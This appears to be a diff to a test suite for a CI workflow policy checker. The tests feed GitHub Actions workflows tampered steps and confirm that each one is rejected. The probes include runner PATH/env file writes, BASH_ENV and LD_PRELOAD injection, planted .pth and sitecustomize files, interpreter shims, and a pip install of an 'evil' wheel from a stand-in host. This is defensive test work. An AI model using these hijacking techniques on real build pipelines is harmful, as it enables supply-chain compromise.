@@ -337,7 +337,7 @@ class PolicyTests(unittest.TestCase):
             ('design', 'tools from PR text', lambda d: admitted(d)['env'].update(CI_TOOLS='${{ github.event.pull_request.title }}'), 'CI_TOOLS must be a literal'),
             ('design', 'unhashed install', lambda d: step(d, python_env.INSTALL_COMMAND).update(run=unhashed), 'ad hoc Python environment or package installation forbidden'),
             ('design', 'source fallback', lambda d: step(d, python_env.INSTALL_COMMAND).update(run=python_env.INSTALL_COMMAND.replace(' --only-binary=:all:', '')), 'ad hoc Python environment'),
-            ('design', 'skipped check', lambda d: step(d, python_env.INSTALL_COMMAND).update(run=python_env.INSTALL_COMMAND.replace('python -B scripts/ci/python_env.py --check\n', '')), 'ad hoc Python environment'),
+            ('design', 'skipped check', lambda d: step(d, python_env.INSTALL_COMMAND).update(run=python_env.INSTALL_COMMAND.replace(python_env.CHECK_COMMAND + '\n', '')), 'ad hoc Python environment'),
             ('design', 'missing venv', lambda d: d['jobs']['validate']['steps'].remove(step(d, python_env.VENV_COMMAND)), 'one fresh venv and one hash-locked install in order'),
             ('design', 'conditional install', lambda d: step(d, python_env.INSTALL_COMMAND).update({'if': 'false'}), 'closure admission steps must be unconditional'),
             ('design', 'hidden install failure', lambda d: step(d, python_env.INSTALL_COMMAND).update({'continue-on-error': 'true'}), 'closure admission steps must be unconditional'),
@@ -572,6 +572,124 @@ class PolicyTests(unittest.TestCase):
         lock.write_text(baseline)
         self.assertEqual(check_policy.check(self.root), [])
 
+    def test_runner_file_environment_and_receipt_adjacency_probes_are_rejected(self):
+        """A-08 and A-10: context-named runner files, expression or shell start-up environments, and any step
+        between the terminal re-check and the receipt."""
+        import python_env
+        self.assertEqual(check_policy.check(self.root), [])
+        def steps(data, jid='validate'): return data['jobs'][jid]['steps']
+        def index(data, run, jid='validate'): return next(i for i, s in enumerate(steps(data, jid)) if s.get('run') == run)
+        def insert_after(run, step, jid='validate'):
+            return lambda data: steps(data, jid).insert(index(data, run, jid) + 1, step)
+        def validator(data): return next(s for s in steps(data) if 'schemas/policy/v1alpha1/validate.py' in s.get('run', ''))
+        def set_env(scope, env):
+            def change(data):
+                target = data if scope == 'workflow' else data['jobs']['validate'] if scope == 'job' else validator(data)
+                target['env'] = env
+            return change
+        install, check = python_env.INSTALL_COMMAND, python_env.CHECK_COMMAND
+        expression = '${{ fromJSON(\'{"PYTHONPATH":"vendor"}\') }}'
+        mutations = [
+            ('design', 'N01 github.path', insert_after(install, {'run': 'echo "$RUNNER_TEMP/v2/bin" >> "${{ github.path }}"'})),
+            ('design', 'N02 github.env', insert_after(install, {'run': 'echo "PYTHONPATH=$PWD/vendor" >> "${{ github.env }}"'})),
+            ('design', 'mixed-case context', insert_after(install, {'run': 'echo dir >> "${{ GitHub.Path }}"'})),
+            ('design', 'indexed context', insert_after(install, {'run': 'echo dir >> "${{ github[\'path\'] }}"'})),
+            ('design', 'whole context', insert_after(install, {'run': 'echo dir >> "${{ fromJSON(toJSON(github)).path }}"'})),
+            ('design', 'action input', insert_after(install, {'uses': 'example/writer@' + 'a' * 40, 'with': {'file': '${{ github.env }}'}})),
+            ('design', 'job env carrying the path file', lambda d: d['jobs']['validate'].setdefault('env', {}).update(HOST_OS='${{ github.path }}')),
+            ('design', 'BASH_ENV through GITHUB_ENV', insert_after(install, {'run': 'echo "BASH_ENV=$PWD/x.sh" >> "$GITHUB_ENV"'})),
+            ('design', 'N05 copy into venv', insert_after(install, {'run': 'cp -r schemas/vendor/jsonschema "$RUNNER_TEMP/validator/lib/python3.14/site-packages/"'})),
+            ('design', 'N06 pth into venv', insert_after(install, {'run': 'printf \'import os\\n\' > "${{ runner.temp }}/validator/lib/python3.14/site-packages/zz.pth"'})),
+            ('design', 'admission step environment', lambda d: steps(d)[index(d, check)].update(env={'HOST_OS': 'x'})),
+            ('design', 'admission step plain bash', lambda d: steps(d)[index(d, check)].update(shell='bash')),
+            ('design', 'install step plain bash', lambda d: steps(d)[index(d, install)].update(shell='bash')),
+        ]
+        for scope in ('workflow', 'job', 'step'):
+            mutations.append(('design', f'N03/N04 {scope} env expression', set_env(scope, expression)))
+            for key in ('BASH_ENV', 'ENV', 'LD_PRELOAD', 'DYLD_INSERT_LIBRARIES', 'BASH_FUNC_python%%', 'PERL5OPT'):
+                mutations.append(('design', f'{scope} {key}', set_env(scope, {key: 'scripts/ci/fixtures/shell-env.sh'})))
+        mutations += [
+            ('design', 'N07 python3 after re-check', insert_after(check, {'run': 'python3 schemas/policy/v1alpha1/validate.py'})),
+            ('design', 'N08 shell python after re-check', insert_after(check, {'shell': 'python {0}', 'run': 'import runpy\nrunpy.run_path("schemas/policy/v1alpha1/validate.py")\n'})),
+            ('design', 'N09 installer shell', insert_after(install, {'shell': 'python -m pip install -r {0}', 'run': 'evil @ https://example.invalid/evil-1.0-py3-none-any.whl'})),
+            ('design', 'action between re-check and receipt', insert_after(check, {'uses': 'example/tool@' + 'a' * 40})),
+            ('design', 'shell step between re-check and receipt', insert_after(check, {'run': 'true'})),
+            ('ci', 'copy and PATH between aggregate re-check and verifier', insert_after(check, {
+                'run': 'cp -a "$RUNNER_TEMP/validator" "$RUNNER_TEMP/v2" && echo "$RUNNER_TEMP/v2/bin" >> "${{ github.path }}"'}, 'ci-required')),
+            ('ci', 'ci-contracts step between re-check and receipt', insert_after(check, {'run': 'true'}, 'ci-contracts')),
+            ('bootstrap', 'bootstrap step between re-check and receipt', insert_after(check, {'shell': 'bash', 'run': 'python3 -c 1'})),
+            ('copilot-code-review', 'Copilot step after re-check', lambda d: steps(d, 'copilot-setup-steps').append({'run': 'python3 -c 1'})),
+        ]
+        for name, label, change in mutations:
+            with self.subTest(mutation=label):
+                self.mutate(name, change)
+                self.assertTrue(check_policy.check(self.root), label)
+                shutil.copyfile(ROOT / f'.github/workflows/{name}.yml', self.root / f'.github/workflows/{name}.yml')
+        self.assertEqual(check_policy.check(self.root), [])
+
+    def test_shell_environment_and_venv_spelling_probes_are_rejected(self):
+        """A-12 and A-14: per-command environment in run scripts and shells, and other spellings of the venv,
+        site-packages, base interpreter and runner file commands (review probes V01 to V19)."""
+        import python_env
+        self.assertEqual(check_policy.check(self.root), [])
+        def steps(data, jid='validate'): return data['jobs'][jid]['steps']
+        def validator(data): return next(s for s in steps(data) if 'schemas/policy/v1alpha1/validate.py' in s.get('run', ''))
+        def proof(data): return next(s for s in steps(data) if s.get('id') == 'proof')
+        def after_install(run):
+            def change(data):
+                index = next(i for i, s in enumerate(steps(data)) if s.get('run') == python_env.INSTALL_COMMAND)
+                steps(data).insert(index + 1, {'run': run})
+            return change
+        def prefix_validator(text):
+            return lambda d: validator(d).update(run=validator(d)['run'].replace(
+                'python schemas/policy/v1alpha1/validate.py\n', text + 'python schemas/policy/v1alpha1/validate.py\n'))
+        probes = [
+            ('V01 absolute venv path', after_install('cp -r vendor/jsonschema /home/runner/work/_temp/validator/lib/python3.14/site-packages/')),
+            ('V02 dot-dot venv path', after_install('cp -r vendor/jsonschema "$RUNNER_TEMP/../_temp/validator/lib/python3.14/site-packages/"')),
+            ('V03 glob venv path', after_install('cp -r vendor/jsonschema "$RUNNER_TEMP"/valid*/lib/python3.14/site-packages/')),
+            ('V03b other glob', after_install('cp -r vendor/jsonschema "$RUNNER_TEMP"/v?lidator/lib/')),
+            ('V04 computed site-packages', after_install('SP=$(python -c \'import sysconfig; print(sysconfig.get_path("purelib"))\')\ncp -r vendor/jsonschema "$SP/"')),
+            ('V05 runner PATH file glob', after_install('echo "$RUNNER_TEMP/v2/bin" >> "$RUNNER_TEMP"/_runner_file_commands/add_path_*')),
+            ('V06 runner env file glob', after_install('echo "LD_LIBRARY_PATH=$PWD/lib" >> "$RUNNER_TEMP"/_runner_file_commands/set_env_*')),
+            ('V07 sitecustomize via pythonLocation', after_install('printf \'import atexit\\n\' > "$pythonLocation/lib/python3.14/sitecustomize.py"')),
+            ('V08 inline PYTHONPATH', prefix_validator('PYTHONPATH=vendor ')),
+            ('V09 export PYTHONPATH', prefix_validator('export PYTHONPATH=vendor\n')),
+            ('V10 env prefix', prefix_validator('env PYTHONPATH=vendor ')),
+            ('V11 env custom shell', lambda d: validator(d).update(shell='env PYTHONPATH=vendor bash -e {0}')),
+            ('V12 inline PYTHONPATH in the proof step', lambda d: proof(d).update(run='PYTHONPATH=vendor python3 schemas/policy/v1alpha1/validate.py\n' + proof(d)['run'])),
+            ('V13 bash shim through a computed path', after_install('cp /bin/true "$(dirname "$(command -v python)")/bash"')),
+            ('V14 python wrapper through a computed path', after_install('B="$(dirname "$(which python)")"; cp wrapper.sh "$B/python"')),
+            ('V18 pth through a glob', after_install('printf \'import atexit\\n\' > "$(echo "$RUNNER_TEMP"/valid*)/lib/python3.14/site-packages/zz.pth"')),
+            ('V19 escaped installer then inline PYTHONPATH', prefix_validator('python -m pi\\p install --target vendor jsonschema\nPYTHONPATH=vendor ')),
+            ('declare -x', prefix_validator('declare -x PYTHONPATH=vendor\n')),
+            ('export of an earlier assignment', prefix_validator('export PYTHONSTARTUP\n')),
+            ('set -a before sourcing', prefix_validator('set -a\n. ./vars.sh\n')),
+            ('set -o allexport', prefix_validator('set -o allexport\n')),
+            ('inline BASH_ENV', prefix_validator('BASH_ENV=./x.sh bash -c true\n')),
+            ('inline LD_PRELOAD', prefix_validator('LD_PRELOAD=./x.so ')),
+            ('inline DYLD_INSERT_LIBRARIES', prefix_validator('DYLD_INSERT_LIBRARIES=./x.dylib ')),
+            ('inline PATH', prefix_validator('PATH="$PWD/shim:$PATH" ')),
+            ('lower-case pythonpath', prefix_validator('pythonpath=vendor ')),
+            ('PIP_ assignment', prefix_validator('PIP_INDEX_URL=https://example.invalid/simple ')),
+            ('python custom shell', lambda d: validator(d).update(shell='python {0}')),
+            ('job default shell', lambda d: d['jobs']['validate'].update(defaults={'run': {'shell': 'env PYTHONPATH=vendor bash -e {0}'}})),
+            ('workflow default shell', lambda d: d.update(defaults={'run': {'shell': 'sh -e {0}'}})),
+            ('toolcache path', after_install('cp sitecustomize.py /opt/hostedtoolcache/Python/3.14.8/x64/lib/python3.14/')),
+        ]
+        for label, change in probes:
+            with self.subTest(probe=label):
+                self.mutate('design', change)
+                self.assertTrue(check_policy.check(self.root), label)
+                shutil.copyfile(ROOT / '.github/workflows/design.yml', self.root / '.github/workflows/design.yml')
+        # Controls: the admitted interpreter toggles, display names and ordinary script names stay accepted.
+        for label, change in (('PYTHONDONTWRITEBYTECODE inline', prefix_validator('PYTHONDONTWRITEBYTECODE=1 ')),
+                              ('validator in a step name', lambda d: validator(d).update(name='Validate with the validator venv')),
+                              ('validate.py scripts', prefix_validator('python schemas/export/v1alpha1/validate.py\n'))):
+            with self.subTest(control=label):
+                self.mutate('design', change)
+                self.assertEqual(check_policy.check(self.root), [], label)
+                shutil.copyfile(ROOT / '.github/workflows/design.yml', self.root / '.github/workflows/design.yml')
+
     def test_windows_runner_selection(self):
         jobs = (
             {'runs-on': 'windows-2025'},
@@ -606,6 +724,7 @@ class PolicyTests(unittest.TestCase):
                                 self.root / '.github/workflows/bootstrap.yml')
 
     def test_windows_shell_defaults_and_overrides(self):
+        # The agent job has Windows rows and is not a closure consumer, whose shells are limited to bash.
         for scope in ('step', 'job'):
             for shell in ('bash', 'pwsh'):
                 with self.subTest(scope=scope, shell=shell):
@@ -618,10 +737,10 @@ class PolicyTests(unittest.TestCase):
                         if scope == 'step': step['shell'] = shell
                         else: job['defaults'] = {'run': {'shell': shell}}
                         job['steps'].insert(-1, step)
-                    self.mutate('bootstrap', change)
+                    self.mutate('agent', change)
                     self.assertEqual(check_policy.check(self.root), [])
-                    shutil.copyfile(ROOT / '.github/workflows/bootstrap.yml',
-                                    self.root / '.github/workflows/bootstrap.yml')
+                    shutil.copyfile(ROOT / '.github/workflows/agent.yml',
+                                    self.root / '.github/workflows/agent.yml')
         def workflow_default_only(data):
             job = data['jobs']['validate']
             job.get('defaults', {}).get('run', {}).pop('shell', None)
@@ -629,7 +748,7 @@ class PolicyTests(unittest.TestCase):
                 if 'run' in step and 'shell' not in step: step['shell'] = 'bash'
             data['defaults'] = {'run': {'shell': 'bash'}}
             job['steps'].insert(-1, {'run': 'python --version'})
-        self.mutate('bootstrap', workflow_default_only)
+        self.mutate('agent', workflow_default_only)
         self.assertTrue(any('Windows run step requires an explicit shell' in error
                             for error in check_policy.check(self.root)))
 
